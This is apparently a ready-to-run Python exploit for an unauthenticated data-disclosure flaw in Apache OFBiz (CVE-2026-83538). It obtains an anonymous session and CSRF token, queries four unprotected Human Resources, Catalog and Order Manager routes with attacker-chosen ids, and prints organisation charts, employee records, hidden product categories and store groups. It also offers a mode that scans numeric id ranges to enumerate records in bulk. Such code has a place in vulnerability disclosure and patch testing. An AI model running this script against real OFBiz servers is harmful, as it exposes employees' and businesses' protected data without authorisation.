#!/usr/bin/env python3
"""Apache OFBiz unauthenticated manager-data disclosure (CVE-2026-83538).

Four Human Resources, Catalog Manager and Order Manager helper routes are
declared auth="false", take an attacker-chosen record id, and return protected
business data with no permission check: getHRChild (org chart and employees),
getChild (product categories, hidden ones included), getProductStoreGroupRollup-
Hierarchy (store groups), and quickadd (a hidden category's detail and whether it
is stocked). Each response hands you the ids for the next request. Fixed in
Apache OFBiz 24.09.08.
"""

import argparse
import html
import json
import os
import re
import sys
from html.parser import HTMLParser

import requests

# One dispatcher covers three JSON tree helpers and the HTML Order Manager quick-add surface.
SURFACES = {
    "hr": dict(label="Human Resources organisation and employee tree",
               boot="/humanres/control/main", path="/humanres/control/getHRChild",
               id_param="partyId", key="hrTree", fmt="json",
               extra={"onclickFunction": "", "additionParam": "", "hrefString": ""}),
    "category": dict(label="Catalog Manager product-category tree",
                     boot="/catalog/control/main", path="/catalog/control/getChild",
                     id_param="productCategoryId", key="treeData", fmt="json",
                     extra={"isCatalog": "false", "isCategoryType": "false", "onclickFunction": ""}),
    "store-group": dict(label="Catalog Manager product-store-group tree",
                        boot="/catalog/control/main", path="/catalog/control/getProductStoreGroupRollupHierarchy",
                        id_param="parentGroupId", key="storeGroupTree", fmt="json",
                        extra={"onclickFunction": ""}),
    "category-detail": dict(label="Order Manager hidden product-category detail",
                            boot="/ordermgr/control/main", path="/ordermgr/control/quickadd",
                            id_param="category_id", key="categoryDetails", fmt="html",
                            extra={"CURRENT_CATALOG_ID": ""}),
}

# --- terminal UI ---
_BANNER = r"""
  ___  _____ ____ ___ _____
 / _ \|  ___| __ )_ _|__  /
| | | | |_  |  _ \| |  / /
| |_| |  _| | |_) | | / /_
 \___/|_|   |____/___/____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg): sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")
def good(msg): sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")
def warn(msg): sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")
def bad(msg): sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")
def die(msg): bad(msg); sys.exit(1)


def emit(obj, nodes):
    good(f"disclosed {len(nodes)} protected record(s) without authentication")
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    print(json.dumps(obj, ensure_ascii=False, indent=2))
    sys.stdout.flush()
# --- end terminal UI ---


class _Text(HTMLParser):
    """Reduce a rendered HTML fragment to stable human-readable evidence."""
    def __init__(self):
        super().__init__()
        self._chunks = []

    def handle_data(self, data):
        self._chunks.append(data)

    def text(self):
        return " ".join("".join(self._chunks).split())


def text_from_html(fragment):
    p = _Text()
    p.feed(fragment)
    p.close()
    return p.text()


def csrf_token(body):
    m = re.search(r'name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)', body, re.I)
    return m.group(1) if m else None


def parse_category_detail(body, category_id):
    """Order Manager quickadd renders the category only if its id is a real option."""
    choose = re.search(r'<form\b(?=[^>]*\bname=["\']choosequickaddform["\'])[^>]*>', body, re.I)
    if not choose:
        return []
    end = body.find("</form>", choose.end())
    options = re.findall(r'<option\b[^>]*\bvalue=(["\'])(.*?)\1', body[choose.start():end], re.I | re.S)
    # Membership in the selector distinguishes a valid category from a generic quick-add page.
    if category_id not in [html.unescape(v) for _, v in options]:
        return []
    headings = re.findall(r'<h2\b[^>]*>(.*?)</h2>', body[:choose.start()], re.I | re.S)
    name = text_from_html(headings[-1]) if headings else ""
    tail = body[end + len("</form>"):]
    bounds = [m.start() for pat in (r'<form\b(?=[^>]*\bname=["\']bulkaddform["\'])', r'<label\b',
                                    r'<p\b[^>]*class=["\']error-500["\']')
              for m in [re.search(pat, tail, re.I)] if m]
    # Stop before the next form/label/error block so unrelated page text is not reported as data.
    detail = tail[:min(bounds)] if bounds else ""
    img = re.search(r'<img\b[^>]*\bsrc=(["\'])(.*?)\1', detail, re.I | re.S)
    return [{
        "categoryId": category_id,
        "categoryName": name,
        "categoryImageUrl": html.unescape(img.group(2)) if img else None,
        "longDescription": text_from_html(detail),
        "hasActiveMembers": bool(re.search(r'<form\b(?=[^>]*\bname=["\']bulkaddform["\'])', body, re.I)),
    }]


def bootstrap(session, base, boot):
    # The login-facing manager page still establishes the anonymous session and AJAX CSRF state.
    r = session.get(base + boot, timeout=15)
    info(f"{boot} returned HTTP {r.status_code}")
    token = csrf_token(r.text)
    headers = {"X-Requested-With": "XMLHttpRequest"}
    if token:
        good("anonymous AJAX CSRF token obtained")
        headers["X-CSRF-Token"] = token
    return headers


def query(session, base, headers, surface, root_id):
    # Each vulnerable helper trusts its caller-supplied tree root, but response envelopes differ.
    data = dict(surface["extra"], **{surface["id_param"]: root_id})
    r = session.post(base + surface["path"], data=data,
                     headers=dict(headers, Accept="application/json" if surface["fmt"] == "json" else "text/html"),
                     timeout=15)
    if r.status_code in (401, 403):
        die(f"{surface['path']} returned HTTP {r.status_code}; the target may be patched")
    if surface["fmt"] == "html":
        return parse_category_detail(r.text, root_id)
    decoded = r.json()
    if "_ERROR_MESSAGE_" in decoded:
        die(f"endpoint reported: {decoded['_ERROR_MESSAGE_']}")
    return decoded.get(surface["key"], [])


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  %(prog)s https://target:8443 hr Company\n"
               "  %(prog)s https://target:8443 category-detail INTERNAL_CAT_ID\n"
               "  %(prog)s https://target:8443 hr --scan 9995 10005\n")
    ap.add_argument("target", metavar="URL", help="OFBiz HTTPS origin, e.g. https://host:8443")
    ap.add_argument("surface", choices=sorted(SURFACES), help="manager-data surface to query")
    ap.add_argument("root_id", nargs="?", metavar="ID", help="record or tree-root identifier")
    ap.add_argument("--scan", nargs=2, type=int, metavar=("START", "END"),
                    help="scan an inclusive numeric id range instead of one id")
    ap.add_argument("--verify-tls", action="store_true", help="verify TLS (off by default; OFBiz ships self-signed certs)")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.no_color:
        globals()["_COLOR"] = False
    if bool(args.root_id) == bool(args.scan):
        ap.error("give either a root_id or --scan START END")

    surface = SURFACES[args.surface]
    banner(f"unauthenticated manager disclosure  ·  CVE-2026-83538")
    base = args.target.rstrip("/")
    session = requests.Session()
    session.verify = args.verify_tls
    if not args.verify_tls:
        requests.packages.urllib3.disable_warnings()

    info(f"Surface: {surface['label']}")
    headers = bootstrap(session, base, surface["boot"])

    if args.root_id:
        nodes = query(session, base, headers, surface, args.root_id)
        if not nodes:
            die(f"{args.root_id!r} returned no protected data (nonexistent, a leaf, or patched)")
        emit({surface["key"]: nodes}, nodes)
        return

    lo, hi = args.scan
    if hi < lo:
        ap.error("--scan END must be >= START")
    info(f"Scanning ids {lo} through {hi}")
    found = 0
    # Sparse ranges are expected; report only identifiers that disclose at least one protected node.
    for rid in range(lo, hi + 1):
        nodes = query(session, base, headers, surface, str(rid))
        if nodes:
            found += 1
            emit({"queriedRootId": str(rid), surface["key"]: nodes}, nodes)
    good(f"Scan complete; {found} id(s) disclosed protected data") if found else die("nothing disclosed in range")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
